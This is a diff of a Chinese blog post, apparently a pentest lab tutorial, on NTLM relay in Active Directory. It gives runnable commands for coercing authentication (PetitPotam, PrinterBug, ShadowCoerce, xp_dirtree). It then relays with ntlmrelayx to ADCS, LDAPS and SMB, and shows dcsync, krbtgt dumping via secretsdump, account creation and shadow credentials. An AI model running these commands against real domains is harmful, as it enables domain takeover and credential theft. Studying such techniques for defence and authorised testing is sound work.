@@ -1,15 +1,20 @@
 # NTLM Relay
 
 
-本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+**本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：**
+
+[The NTLM Authentication Protocol and Security Support Provider](http://davenport.sourceforge.net/ntlm.html)
 
 [NTLM 篇 - windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian)
 
 [NTLM Relay - hackndo](https://en.hackndo.com/ntlm-relay/)
 
-本篇主要围绕下图进行。[来自](https://www.thehacker.recipes/ad/movement/ntlm/relay)
+本篇主要围绕下图进行。[来自](https://en.hackndo.com/ntlm-relay/)
 
-![NTLM relay.drawio.png](https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png "https://www.thehacker.recipes/ad/movement/ntlm/relay")
+![NTLM relay.drawio.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png "https://www.thehacker.recipes/ad/movement/ntlm/relay")
+
+
+原理直接看国外老哥写的这篇文章[NTLM RELAY](https://en.hackndo.com/ntlm-relay/)。本文主要讲Relay的一些路径。
 
 ## 触发NTLM认证。
 
@@ -26,7 +31,7 @@ https://github.com/topotam/PetitPotam
 
 如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。
 
-![image.png](https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png)
 
 
 #### PrinterBug（MS-RPRN）
@@ -44,7 +49,7 @@ https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 > **滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。**
 >
 
-![image.png](https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png)
 
 https://github.com/ShutdownRepo/ShadowCoerce
 
@@ -57,9 +62,10 @@ python3 shadowcoerce.py -d "adc.com" -u "mssql" -p "song@2020" 10.10.10.123 10.1
 
 ```bash
 exec master.dbo.xp_dirtree '\\10.10.10.123\test'
+
 ```
 
-![image.png](https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png)
 
 目标机器安装webclient时，可通过指定端口触发http类型认证。
 
@@ -72,7 +78,7 @@ xp_dirtree '\\hostname@SSL@1234\test' --ssl port 1234
 xp_dirtree '\\hostname@1234\test' --http
 ```
 
-![image.png](https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png)
 
 ### HTTP
 
@@ -88,7 +94,7 @@ xp_dirtree '\\hostname@1234\test' --http
 Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 ```
 
-![image.png](https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png)
 
 
 还有A-TEAM大哥们提到的WEBDAV XXE
@@ -109,7 +115,7 @@ https://github.com/dirkjanm/mitm6
 Inveigh.exe -spooferip 192.168.52.129
 ```
 
-![image.png](https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png)
 
 #### 邮件钓鱼
 
@@ -117,9 +123,10 @@ outlook与foxmail 图片预览功能支持HTTP和UNC路径，可触发SMB和http
 
 获取HTTP需要在可信域，需要添加一条DNS记录。
 
-![image-20220219125011221](https://s2.loli.net/2022/02/19/rmQYGvTsH54neNP.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png)
 
-![image-20220219125106389](https://s2.loli.net/2022/02/19/1BDOyZ5rinPSUXm.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png)
+
 
 #### XXE与SSRF
 
@@ -151,18 +158,18 @@ LDAP一般只安装在域控上，默认是协商签名而非强制签名。
 * 即当relay时SMB签名开启或者强制签名时：需要签名
 * 当SMB签名关闭（SMBv1）或者HTTP的流量时：不需要签名
 
-![image.png](https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png)
 
 ### SMB
 
 域控：作为server端，域控默认是强制SMB签名的。
 
-![image.png](https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png)
 
 
 域内普通机器：作为客户端，默认不开强制签名，默认为Enabled。
 
-![image.png](https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png)
 
 
 ## Relay To？
@@ -190,36 +197,48 @@ certutil -config - -ping
 
 利用
 
+```bash
 python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
-![image.png](https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png)
+```
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png)
 
 
-Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:`base64cert` /domain:adc.com /dc:10.10.10.10 /ptt
+```bash
+Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:base64cert /domain:adc.com /dc:10.10.10.10 /ptt
+```
 
-![image.png](https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png)
 
 mimikatz
 
-`lsadump::dcsync /all`
+```bash
+lsadump::dcsync /all
+```
 
 ### Cred Dump
 
 敬请期待
 
-https://github.com/SecureAuthCorp/impacket/pull/1253
+[https://github.com/SecureAuthCorp/impacket/pull/1253](https://github.com/SecureAuthCorp/impacket/pull/1253)
+
 
 ### EXEC
 
+```bash
 python3 ntlmrelayx.py -t smb://10.10.10.15 --remove-mic -c whoami
+```
 
-![image-20220219230131789](https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png)
 
-### 枚举域内信息
+### 枚举信息
 
-python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic![image-20220219230609579](https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png)
+```bash
+python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic
+```
 
-![image-20220219230750303](https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png)
 
 ### 创建用户（LDAPS）
 
@@ -227,25 +246,29 @@ python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --re
 
 域有个属性`ms-DS-MachineAccountQuota` 他标志着非特权用户最多添加多少机器账户到域内。默认为10。
 
-![image-20220219234336853](https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png)
 
+```bash
 python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic
+```
 
-![image-20220219234418973](https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png)
 
 2. **添加普通用户**
 
 需要高权限账户（比如说域管）才可以，
 
+```bash
 python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic
+```
 
-![image-20220219234738893](https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png)
 
 ### Exchange
 
 **存在CVE-2019-1040漏洞的情况下，可以从SMB->LDAP(s)。而无需考虑签名的情况。**
 
-Exchange的机器账户是域内的高权限账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：
+Exchange的机器账户是域内高权账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：
 
 * 复制目录更改
 * 复制目录更改所有项
@@ -254,26 +277,31 @@ Exchange的机器账户是域内的高权限账户，对域有WriteDACL权限。
 
 当exchange存在SSRF漏洞([CVE-2018-8581](https://github.com/dirkjanm/PrivExchange))时。可触发http类型的NTLM认证。不需要考虑签名问题。
 
+```bash
 python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123  10.10.10.21
+```
 
 **等待一分钟**
 
-![image.png](https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png)
 
-![image.png](https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png)
 
 
 没有SSRF时，可通过触发SMB类型流量结合CVE-2019-1040移除MIC完整型检验.
 
+```bash
 python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --escalate-user wukong --remove-mic
+```
 
-![image.png](https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png)
 
+```bash
 python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt
 
-![image.png](https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png)
+```
 
-
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png)
 
 ### 影子凭证（Shadow Credentials）
 
@@ -285,9 +313,9 @@ python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -
 > Microsoft 还引入了密钥信任的概念，以在不支持证书信任的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。
 >
 
-![image.png](https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")
 
-![image.png](https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")
 
 简单来说就是客户端有自己的一对密钥，KDC也存着用户的公钥。使用私钥加密预认证信息发给KDC，KDC使用用户的公钥解密，验证通过返回TGT。
 
@@ -306,24 +334,28 @@ Windows server2016引进了一个属性`msDS-KeyCredentialLink`。
 python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yangguo" --action "list"  --dc-ip 10.10.10.10
 ```
 
-![image.png](https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png)
 
-第一次大概率会遇到下面的错误。需要去域控上注册证书。[FAS - Request not supported while launching a published Desktop with FAS](https://support.citrix.com/article/CTX218941)
+第一次大概率会遇到下面的错误。需要去域控上注册证书。
 
-![image.png](https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png)
+[FAS - Request not supported while launching a published Desktop with FAS](https://support.citrix.com/article/CTX218941)
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png)
+
 
 **获取hash**：原理看下面这段话
 
-![image.png](https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")
 
-![image.png](https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png)
 
-2. 结合NTLM Relay
+2. **结合NTLM Relay**
 
-https://github.com/SecureAuthCorp/impacket/pull/1249
+[https://github.com/SecureAuthCorp/impacket/pull/1249](https://github.com/SecureAuthCorp/impacket/pull/1249)
 
-> 用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。[Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
-
+> 用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。  
+> 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。
+>
 
 ### RBCD（低权限）
 
@@ -341,7 +373,4 @@ https://github.com/SecureAuthCorp/impacket/pull/1249
 [安全研究 | 使用PetitPotam代替Printerbug](https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ)
 
 [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
-
-[Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
-
 
